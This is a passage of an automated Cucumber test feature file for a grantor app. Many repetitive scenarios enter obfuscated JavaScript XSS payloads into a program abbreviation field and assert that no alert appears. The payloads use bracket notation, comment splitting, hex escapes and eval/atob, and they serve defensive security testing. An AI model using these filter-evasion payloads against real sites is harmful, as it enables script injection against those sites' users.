      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                               | Field                |
      | ';globalThis['ale'+'rt'](globalThis['doc'+'ument']['dom'+'ain']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301645 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                          | Field                |
      | ';window[/*foo*/'alert'/*bar*/](window[/*foo*/'document'/*bar*/]['domain']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301646 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                      | Field                |
      | ';self[/*foo*/'alert'/*bar*/](self[/*foo*/'document'/*bar*/]['domain']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301647 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                      | Field                |
      | ';this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301648 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                    | Field                |
      | ';top[/*foo*/'alert'/*bar*/](top[/*foo*/'document'/*bar*/]['domain']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301649 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                          | Field                |
      | ';parent[/*foo*/'alert'/*bar*/](parent[/*foo*/'document'/*bar*/]['domain']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301650 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                          | Field                |
      | ';frames[/*foo*/'alert'/*bar*/](frames[/*foo*/'document'/*bar*/]['domain']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301651 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                  | Field                |
      | ';globalThis[/*foo*/'alert'/*bar*/](globalThis[/*foo*/'document'/*bar*/]['domain']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301652 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                       | Field                |
      | ';window['\x61\x6c\x65\x72\x74'](window['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301653 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                   | Field                |
      | ';self['\x61\x6c\x65\x72\x74'](self['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301655 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                   | Field                |
      | ';this['\x61\x6c\x65\x72\x74'](this['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301656 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                 | Field                |
      | ';top['\x61\x6c\x65\x72\x74'](top['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301657 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                       | Field                |
      | ';parent['\x61\x6c\x65\x72\x74'](parent['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301659 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                       | Field                |
      | ';frames['\x61\x6c\x65\x72\x74'](frames['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301660 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                               | Field                |
      | ';globalThis['\x61\x6c\x65\x72\x74'](globalThis['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301661 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                 | Field                |
      | ';window['\x65\x76\x61\x6c']('window["\x61\x6c\x65\x72\x74"](window["\x61\x74\x6f\x62"]("WFNT"))');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301663 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                           | Field                |
      | ';self['\x65\x76\x61\x6c']('self["\x61\x6c\x65\x72\x74"](self["\x61\x74\x6f\x62"]("WFNT"))');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
